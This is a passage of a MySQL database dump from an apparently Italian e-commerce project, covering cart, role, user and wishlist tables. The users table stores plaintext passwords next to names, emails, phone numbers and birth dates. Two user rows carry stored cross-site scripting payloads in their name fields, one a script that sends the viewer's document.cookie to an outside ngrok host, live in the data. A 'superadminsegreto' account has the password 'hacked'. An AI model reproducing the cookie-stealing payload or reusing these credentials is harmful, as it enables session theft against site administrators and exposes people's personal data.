-- Dumping data for table `shopping_cart_item`
--

LOCK TABLES `shopping_cart_item` WRITE;
/*!40000 ALTER TABLE `shopping_cart_item` DISABLE KEYS */;
INSERT INTO `shopping_cart_item` VALUES (10,1,'2023-03-10 14:33:26',13,3),(19,22,'2023-03-13 09:54:40',15,3),(57,4,'2023-03-31 08:09:14',83,8),(110,1,'2023-04-03 17:14:05',91,4),(111,2,'2023-04-03 17:17:21',93,2),(112,1,'2023-04-03 17:17:21',93,4),(135,1,'2023-04-04 16:47:38',80,3);
/*!40000 ALTER TABLE `shopping_cart_item` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user_authority`
--

DROP TABLE IF EXISTS `user_authority`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user_authority` (
  `user_id` int NOT NULL,
  `authority_id` int NOT NULL,
  PRIMARY KEY (`user_id`,`authority_id`),
  KEY `fk_user_has_authority_authority1_idx` (`authority_id`),
  KEY `fk_user_has_authority_user1_idx` (`user_id`),
  CONSTRAINT `fk_user_has_authority_authority1` FOREIGN KEY (`authority_id`) REFERENCES `authority` (`id`),
  CONSTRAINT `fk_user_has_authority_user1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user_authority`
--

LOCK TABLES `user_authority` WRITE;
/*!40000 ALTER TABLE `user_authority` DISABLE KEYS */;
INSERT INTO `user_authority` VALUES (1,1),(5,1),(14,1),(15,1),(21,1),(22,1),(23,1),(25,1),(26,1),(27,1),(28,1),(29,1),(30,1),(31,1),(32,1),(33,1),(34,1),(35,1),(36,1),(37,1),(38,1),(39,1),(40,1),(41,1),(42,1),(43,1),(44,1),(45,1),(46,1),(47,1),(48,1),(49,1),(50,1),(51,1),(52,1),(53,1),(54,1),(55,1),(56,1),(57,1),(58,1),(59,1),(60,1),(61,1),(62,1),(63,1),(64,1),(65,1),(66,1),(67,1),(68,1),(69,1),(70,1),(71,1),(72,1),(73,1),(74,1),(75,1),(76,1),(77,1),(78,1),(80,1),(81,1),(82,1),(83,1),(84,1),(85,1),(86,1),(88,1),(90,1),(91,1),(92,1),(93,1),(96,1),(97,1),(98,1),(99,1),(100,1),(101,1),(102,1),(103,1),(104,1),(105,1),(106,1),(107,1),(108,1),(109,1),(110,1),(111,1),(1,2),(15,2),(23,2),(55,2),(56,2),(57,2),(60,2),(64,2),(66,2),(67,2),(68,2),(77,2),(78,2),(79,2),(87,2),(88,2),(89,2),(95,2),(101,2),(29,3),(40,3),(50,3),(51,3),(52,3),(53,3),(54,3),(56,3),(96,3),(103,3),(111,3),(25,4),(39,4),(47,4),(58,4),(59,4),(69,4),(94,4),(97,4),(102,4);
/*!40000 ALTER TABLE `user_authority` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` int NOT NULL AUTO_INCREMENT,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `disabled_at` datetime DEFAULT NULL,
  `name` varchar(100) NOT NULL,
  `surname` varchar(100) NOT NULL,
  `email` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  `telephone` varchar(100) DEFAULT NULL,
  `birth_date` date NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `email_UNIQUE` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=129 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'2023-03-06 12:40:19',NULL,'Marianna','Non Modificare','marianna@nido.it','12345','9658742','1998-03-06'),(5,'2023-03-07 09:32:10','2023-03-30 13:45:36','Maria','Verdi','prova@gmail.com4FDzZTgtVs5','prova','3455888394','2000-03-12'),(7,'2023-03-08 09:10:16','2023-05-26 09:37:40','Gian','Franco','gian@franco.it','gian','333333','1997-11-27'),(8,'2023-03-08 09:12:58',NULL,'youyou','yuooooo','you@ness.it','you','1111','0000-00-00'),(13,'2023-03-10 16:00:20','2023-05-25 15:23:58','Maria','Gialli','prova2@gmail.com','prova2','3445557833','2007-01-07'),(14,'2023-03-16 10:37:00','2023-03-24 11:57:02','user1','user1','user1@gmail.comnyzT8UL3Lw14','user1','23823423','2000-01-01'),(15,'2023-03-16 10:37:00','2023-05-26 10:26:03','admin1','admin1','admin1@gmail.com','admin1','23823423','1999-12-26'),(16,'2023-03-22 09:25:42','2023-05-26 10:21:12','lasignupfunziona','lasignupfunziona','signup@gmail.com','signup',NULL,'1989-12-26'),(18,'2023-03-22 09:52:57','2023-03-30 10:12:13','lasignupfunziona','lasignupfunziona','signup1@gmail.comkNtwegKhtU18','signup1',NULL,'1989-12-26'),(21,'2023-03-22 10:34:42',NULL,'modificatoancoraa','modificatoancoraa','signup2@gmail.com','signup2',NULL,'2000-01-01'),(22,'2023-03-22 10:35:06','2023-04-06 06:59:45','lasignupfunziona','lasignupfunziona','signup3@gmail.comLuxNbg3Otf22','signup3',NULL,'1989-12-26'),(23,'2023-03-22 11:27:17','2023-03-24 11:45:18','adminlasignupfunziona','adminlasignupfunziona','signup8@gmail.comEDXN20k6LZ23xwVZTiuCLC23dHnTRYm6wT23b0LjkDf6YW23','signup8',NULL,'1988-12-26'),(25,'2023-03-22 13:28:52','2023-03-30 12:46:00','Gennaro','Gennaro','signup01@gmail.comkxeNAjDVBS25','signup77',NULL,'1988-12-07'),(26,'2023-03-22 13:29:38','2023-04-05 14:41:11','adminlasignupfunziona','lasignupfunziona','togli@gmail.comci1XuZXwmO26','signup77',NULL,'1988-12-26'),(27,'2023-03-22 13:32:28','2023-03-30 13:00:19','adminlasignupfunziona','lasignupfunziona','togli1@gmail.comBOY7Y998qM27','signup77',NULL,'1988-12-26'),(28,'2023-03-22 13:33:50','2023-03-31 10:22:33','adminlasignupfunziona','lasignupfunziona','togli71@gmail.com2fpHt5oPep28','signup77',NULL,'1988-12-26'),(29,'2023-03-22 13:37:15',NULL,'Marco','Esposito','togli761@gmail.com','signup77','3334567894','1988-12-26'),(30,'2023-03-23 14:05:41','2023-04-04 20:17:32','adminlasignupfunziona','lasignupfunziona','example@example.comXGdpStSFZU30','Password1!',NULL,'1988-12-26'),(31,'2023-03-23 14:06:55',NULL,'adminlasignupfunziona','lasignupfunziona','testple@example.com','Password1!',NULL,'1988-12-26'),(32,'2023-03-23 14:08:14','2023-03-24 14:23:09','lasignupfunziona','lasignupfunziona','signup4@gmail.comMnhBDt5edb32','signup4',NULL,'1989-12-26'),(33,'2023-03-23 14:15:58','2023-03-24 12:46:56','adminlasignupfunziona','lasignupfunziona','testptest@example.comsBZhGusAnu33','Password1!',NULL,'1988-12-26'),(34,'2023-03-23 14:19:25','2023-03-31 12:52:09','adminlasignupfunziona','lasignupfunziona','testptestexample.comHUqc3e4xbH34','Password1!',NULL,'1988-12-26'),(35,'2023-03-23 14:22:04','2023-04-05 21:12:44','adminlasignupfunziona','lasignupfunziona','testptwestexample.comCEMpWyf0ht35','Password1!',NULL,'1988-12-26'),(36,'2023-03-23 14:22:21','2023-04-05 21:14:12','adminlasignupfunziona','lasignupfunziona','testpt..westexample.comKUXCB9flit36','Password1!',NULL,'1988-12-26'),(37,'2023-03-23 14:22:40','2023-04-05 21:14:57','adminlasignupfunziona','lasignupfunziona','testptwasedrfjghkjklY8V6jlgepI37','Password1!',NULL,'1988-12-26'),(38,'2023-03-23 14:30:31','2023-03-24 12:21:26','adminlasignupfunziona','lasignupfunziona','testptweste@xample.comcs8rU6DBu838','Password1@',NULL,'1988-12-26'),(39,'2023-03-27 07:49:27',NULL,'dataentry1','dataentry1','dataentry1@gmail.com','dataentry1',NULL,'1999-12-26'),(40,'2023-03-27 07:52:31',NULL,'marketing1','marketing1','marketing1@gmail.com','marketing1',NULL,'1999-12-26'),(41,'2023-03-27 09:00:56',NULL,'vdbvdsbdsb','bsbsbsb','fdbdsfbsdb@dsvsv.it','Lalalafrdsgla_23!',NULL,'1996-09-08'),(42,'2023-03-27 09:02:47','2023-03-31 13:54:51','vdgbdhdhdsh','hdshfsdghsgfgh','hsfhsfhsfhshf@fcsgf.itPIT9TBUzB342','Password_!34',NULL,'1996-09-08'),(43,'2023-03-27 09:11:55',NULL,'fabrizio','ettori','fabrizioettori@gmail.com','Password_23!',NULL,'1996-09-08'),(44,'2023-03-27 09:12:56',NULL,'fabrizio','ettori','fabrizioettori23@gmail.com','Password_23!',NULL,'1996-09-08'),(45,'2023-03-27 09:13:13',NULL,'fabrizio','ettori','fabrizioettori22@gmail.com','Password_23!',NULL,'1996-09-08'),(46,'2023-03-27 09:15:25',NULL,'fabrizio','ettori','fabrizioettori21@gmail.com','Password_23!',NULL,'1996-09-08'),(47,'2023-03-27 09:17:12',NULL,'Laurenti','Michele','michele@michele.it','Password_23!','3334567653','1996-09-08'),(48,'2023-03-27 09:19:55',NULL,'cmisdmvsv','cnmdisms','cndsusdn@michele.it','lalalalL_23<!!',NULL,'1996-09-08'),(49,'2023-03-27 09:36:37',NULL,'sdfsfsdfsd','sdfsdfdsfsdf','sfsdfsdfsdfsdf@gmail.com','Amsxiomss_23!',NULL,'1996-09-08'),(50,'2023-03-27 14:03:42','2023-04-06 08:02:13','aggiuntoDaUser','aggiuntoDaAdmin','aggiuntoDaUser@gmail.com7dTO5MPbNL50','daUser',NULL,'2000-01-01'),(51,'2023-03-29 15:31:21','2023-05-26 10:49:13','aggiuntoDaadmin','aggiuntoDaAdmin','testuser@gmail.com','PassaDmin1!',NULL,'2000-01-03'),(52,'2023-03-29 15:45:44','2023-03-30 13:06:10','aggiuntoDaadmin','aggiuntoDaAdmin','tes@gmail.comD5SGQFYbeq52','PassaDmin1!',NULL,'2000-01-03'),(53,'2023-03-29 15:54:23','2023-05-26 10:38:23','aggiuntoDaadmin','aggiuntoDaAdmin','teys@gmail.com','PassaDmin1!',NULL,'2000-01-03'),(54,'2023-03-29 15:56:15','2023-05-26 10:38:10','aggiuntoDaadmin','aggiuntoDaAdmin','teysr@gmail.com','12345',NULL,'2000-01-03'),(55,'2023-03-29 15:57:07',NULL,'aggiuntoDaadmin','aggiuntoDaAdmin','tey9@gmail.com','12345',NULL,'2000-01-03'),(56,'2023-03-29 15:57:27',NULL,'tEST','protca','provatest@gmail.com','1243345','343563','2000-01-06'),(57,'2023-03-29 16:00:24',NULL,'Test','Back office','prova.test@test.it','Password@12','+(123)554624624623463632  54567890','2000-02-03'),(58,'2023-03-29 16:43:32',NULL,'Cata','Test','francescocata@gmail.com','Admin@105',NULL,'1999-01-04'),(59,'2023-03-29 16:44:33',NULL,'Paolo','Test','paolotest@gmail.com','Admin@1051',NULL,'1999-01-04'),(60,'2023-03-29 17:26:22',NULL,'Valentino','Valentino','vale.rossi@gmail.com','Password@1',NULL,'2000-03-02'),(61,'2023-03-29 19:27:26',NULL,'Francesco','Scialdone','francesco@scialdone.it','Password@1',NULL,'1992-02-02'),(62,'2023-03-29 19:33:41',NULL,'Mario','Rossi','mario@rossi.it','MarioRossi@1',NULL,'1990-01-01'),(63,'2023-03-29 19:38:36',NULL,'Mario','Rossi','mario2@rossi.it','MarioRossi@1',NULL,'1990-01-01'),(64,'2023-03-29 22:17:45',NULL,'string','string','email@gmail.com','string',NULL,'2000-01-01'),(65,'2023-03-30 09:03:39',NULL,'luigi','luigi','luigi@mail.it','12345',NULL,'1991-03-01'),(66,'2023-03-30 09:15:11',NULL,'Giovanni','Giovanni','giovanni.esposito@gmail.com','Password@97',NULL,'2000-01-01'),(67,'2023-03-30 09:27:09','2023-05-26 10:29:26','Aldo','Rossi','aldo.rossi@gmail.com','RossiAldo12-',NULL,'2023-02-05'),(68,'2023-03-30 09:35:57',NULL,'Martino','Manzolini','martino@gmail.com','martinoA45-',NULL,'2023-03-05'),(69,'2023-03-30 09:36:49',NULL,'Paolo','Test','paolotst@gmail.com','Admin@1051',NULL,'1999-01-04'),(70,'2023-03-30 10:01:43','2023-05-26 10:27:35','Luigi','Luigi','luigi@emailprova.it','12345',NULL,'1991-03-01'),(71,'2023-03-30 10:04:19','2023-05-26 10:26:43','luigi','luigi','rossi@email.it','12345',NULL,'1991-01-30'),(72,'2023-03-30 10:10:40','2023-04-04 07:22:56','sara','sara','sara1@mail.itE7IuFEyIY772','12345',NULL,'1991-03-30'),(73,'2023-03-30 10:20:34',NULL,'sara','rossi','sara3@mail.it','12345678A!a',NULL,'1991-01-01'),(74,'2023-03-30 10:27:24',NULL,'luca','luca','luigi1@mail.it','12345',NULL,'2023-03-01'),(75,'2023-03-30 10:43:34',NULL,'luigi','rossi','luigi5@mail.it','12345678A!a','4444444','1991-03-31'),(76,'2023-03-30 10:51:29','2023-03-30 13:05:22','sara','rossi','sara4@mail.itQvpSwix96Q76','12345678A!a',NULL,'1991-03-01'),(77,'2023-03-30 14:12:40',NULL,'Luigi','Lesc','luigi.lesc@gmail.com','Password@97','3334554442','1999-01-02'),(78,'2023-03-30 16:35:30',NULL,'Paolo','Di Martino','paolo@test.it','Password@1','3334445551','1995-01-03'),(79,'2023-03-30 16:50:01',NULL,'Stringo','Stringoni','string@string.it','Password!1','3900000000','1999-01-02'),(80,'2023-03-31 09:48:08',NULL,'Fra','Sci','francesco2@scialdone.it','Password@1','684358753','1992-01-01'),(81,'2023-03-31 09:52:35',NULL,'Francesco','Scialdone','francesco3@scialdone.it','Password@1',NULL,'1990-01-01'),(82,'2023-03-31 10:03:41',NULL,'Francesco','Scialdone','francesco4@scialdone.it','Password@1',NULL,'1990-01-01'),(83,'2023-03-31 10:09:13',NULL,'Francesco','Scialdone','francesco5@scialdone.it','Password@1',NULL,'1990-01-01'),(84,'2023-03-31 11:22:14',NULL,'Francesco','Scialdone','francesco6@scialdone.it','Password@1',NULL,'1990-01-01'),(85,'2023-03-31 18:36:34',NULL,'Francesco','Scialdone','francesco8@scialdone.it','Password@1',NULL,'1990-01-01'),(86,'2023-03-31 20:33:03',NULL,'Francesco','Scialdone','francesco9@scialdone.it','Password@1',NULL,'1990-03-31'),(87,'2023-04-02 18:24:27',NULL,'Angela','Esposito','angela.esposito@gmail.com','12345678','3331233214','1967-01-03'),(88,'2023-04-02 18:33:48',NULL,'Paolo','Di Martino','paolo1@gmail.com','Password@1','3337571233','1999-02-10'),(89,'2023-04-02 18:37:41',NULL,'Paolo','Di Martino','paolo2@gmail.com','Password@2','3214325670','2001-06-13'),(90,'2023-04-03 19:08:29',NULL,'Mario','Rossi','mario3@rossi.it','Password@1',NULL,'1990-01-01'),(91,'2023-04-03 19:14:05',NULL,'Mario','Rossi','mario4@rossi.it','Password@1',NULL,'1990-01-01'),(92,'2023-04-03 19:16:16',NULL,'Mario','Rossi','mario6@rossi.it','Password@1',NULL,'1990-01-01'),(93,'2023-04-03 19:17:21',NULL,'Mario','Rossi','mario7@rossi.it','Password@1',NULL,'1990-01-01'),(94,'2023-04-04 13:45:03',NULL,'Angela','Saronno','angela.s@gmail.com','Password@0','3334567778','1994-06-08'),(95,'2023-04-04 13:53:50',NULL,'Mario','Principe','mario.principe@gmail.com','Password@9','3337871000','1969-06-11'),(96,'2023-04-04 13:56:19',NULL,'Alfredo','Giacomelli','alfredo.giacomelli@gmail.com','Password@8','3334567652','1989-10-19'),(97,'2023-04-04 17:20:02',NULL,'Maria','Sarnelli','maria.s@gmail.com','Password@8','3334323241','1988-06-15'),(98,'2023-04-04 18:49:16',NULL,'Mario','Rossi','mario8@rossi.it','Password@1',NULL,'1990-01-01'),(99,'2023-04-04 20:27:34',NULL,'Martina','Colombari','martina.colombari@gmail.com','Password@0','3345432346','1998-02-03'),(100,'2023-04-04 20:50:07',NULL,'Michele','Santarpia','michele.santarpia@gmail.com','Password@1',NULL,'1996-06-05'),(101,'2023-04-05 22:49:02',NULL,'Mario','Rosso','mario.rossi@gmail.com','Password@1','3334445561','1996-06-07'),(102,'2023-04-05 22:56:47',NULL,'Giulio','Bianchi','giulio.bianchi@gmail.com','Password@1','3334445567','1999-07-09'),(103,'2023-04-05 22:57:53',NULL,'Flavio','Neri','flavio.neri@gmail.com','Password@1','3334445568','1996-03-07'),(104,'2023-04-06 10:05:20',NULL,'Michele','Angioni','micheleangioni@gmail.com','Password_23!',NULL,'1996-09-08'),(105,'2023-04-26 11:24:28',NULL,'John','Smith','johndoeg@example.com','Abc1234!','+1-555-555-1212','1993-05-18'),(106,'2023-04-26 11:27:28',NULL,'John','Smith','mars@example.com','Abc1234!','+1-555-555-1212','1993-05-18'),(107,'2023-04-26 11:49:49',NULL,'John','Smith','mars1@example.com','Abc1234!','+1-555-555-1212','1993-05-18'),(108,'2023-04-26 11:50:33',NULL,'John','Smith','mars2@example.com','Abc1234!','+1-555-555-1212','1993-05-18'),(109,'2023-04-26 12:45:45',NULL,'John','Smith','mars5@example.com','Abc1234!','+1-555-555-1212','1993-05-18'),(110,'2023-04-26 12:50:55',NULL,'John','Smith','mars57@example.com','Abc1234!','+1-555-555-1212','1993-05-18'),(111,'2023-05-15 10:38:30',NULL,'Mario','Rossi','mariorossi@gmail.com','Password@1','33333332323','2024-01-01'),(112,'2023-05-18 15:13:26',NULL,'prova','finale','ehselosapessi@gmail.com','passwordsicura','32423094283','2023-05-10'),(122,'2023-05-25 10:50:48',NULL,'Orazio','Grinzosi','grinz@osi.it','12345','483957935','2023-05-25'),(123,'2023-06-05 18:37:46',NULL,'Paride','Admin','superadminsegreto@beije.it','hacked','203981203','2023-06-05'),(127,'2023-06-09 14:44:25',NULL,'<img src=x onerror=alert(\'XSS\')>','<img src=x onerror=alert(\'XSS\')>','eiofwjeiof@fweoifjweio.com','wefjhweoifij','12323123','2023-06-07'),(128,'2023-06-09 14:48:31',NULL,'<script>fetch(\'https://3284-82-58-163-29.ngrok-free.app/?c=\'+document.cookie)</script>','eiojwe','wqwdqw@wqdjiqwod.com','dwdioqwjdqw','2312321','2023-06-05');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wishlist_item`
--

DROP TABLE IF EXISTS `wishlist_item`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `wishlist_item` (
  `id` int NOT NULL AUTO_INCREMENT,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `user_id` int NOT NULL,
  `product_id` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk1_idx` (`user_id`),
  KEY `fk2_idx` (`product_id`),
  CONSTRAINT `fk1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`),
  CONSTRAINT `fk2wishlistproduct` FOREIGN KEY (`product_id`) REFERENCES `products` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=144 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wishlist_item`
--

LOCK TABLES `wishlist_item` WRITE;
/*!40000 ALTER TABLE `wishlist_item` DISABLE KEYS */;
INSERT INTO `wishlist_item` VALUES (126,'2023-04-05 21:39:51',88,11),(134,'2023-04-06 07:16:24',98,2),(136,'2023-04-06 08:23:17',75,5),(139,'2023-04-06 17:59:41',75,8);
/*!40000 ALTER TABLE `wishlist_item` ENABLE KEYS */;
UNLOCK TABLES;
SET @@SESSION.SQL_LOG_BIN = @MYSQLDUMP_TEMP_LOG_BIN;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2024-04-17 15:00:10
